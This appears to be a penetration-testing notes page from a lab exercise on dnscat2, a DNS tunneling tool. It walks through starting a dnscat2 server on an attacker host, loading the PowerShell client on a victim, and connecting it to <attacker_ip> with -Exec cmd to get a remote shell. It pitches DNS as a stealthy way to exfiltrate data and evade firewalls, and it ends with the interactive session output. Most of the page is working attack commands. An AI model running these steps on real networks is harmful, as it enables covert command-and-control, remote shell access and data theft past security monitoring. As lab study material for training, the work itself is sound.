---
description: >-
  Dnscat2 is a tunneling tool that uses DNS protocol to send data between two
  hosts. It uses an encrypted C2 channel and sends data inside TXT records
  within the DNS protocol.
---

# Dnscat2

IMPORTANT: Here's how Dnscat2 works: Every Active Directory domain environment in a corporate network has it's own DNS server. When a local DNS server tries to reslove an external address (Dnscat2). Data is exfiltrated and sent over the network instead of a legitimate DNS request.

DNS can be an extremely stealthy approach to exfiltrating data while evading firewall detections.&#x20;

Firewall's usually strip HTTPS connections and sniff traffic, with this DNS we can evade those detection.



**Cloning dnscat2 and Setting Up the Server**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ git clone https://github.com/iagox86/dnscat2.git
</strong>
cd dnscat2/server/
sudo gem install bundler
bundle install
</code></pre>

**Starting the dnscat2 server**

```shell-session
attacker@kali$ sudo ruby dnscat2.rb --dns host=<attacker_ip>,port=53,domain=inlanefreight.local --no-cache
...
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
```

After running the server we get a secret key. We provide our Dnscat2 client on the victim host so that it can authenticate and encrypt the data to our external DNS server.



**Cloning dnscat2-powershell to the Attack Host**

Dnscat2 comes with a client, but we'll use a powershell client instead.

```shell-session
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

_<mark style="color:red;">**NOTE:**</mark>_ Transfer this file to the target then proceed.

**Importing dnscat2.ps1**

```powershell-session
PS C:\victim> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host.

```powershell-session
PS C:\victim> Start-Dnscat2 -DNSserver <attacker_ip> -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

_<mark style="color:red;">**IMPORTANT:**</mark>_ We must use the secret -PreSharedSecret generated on the server to ensure our session is established and encrypted.\


**Listing dnscat2 Options**

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

**Interacting with the Established Session**

Like metasploit we can select sessions with:

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

\
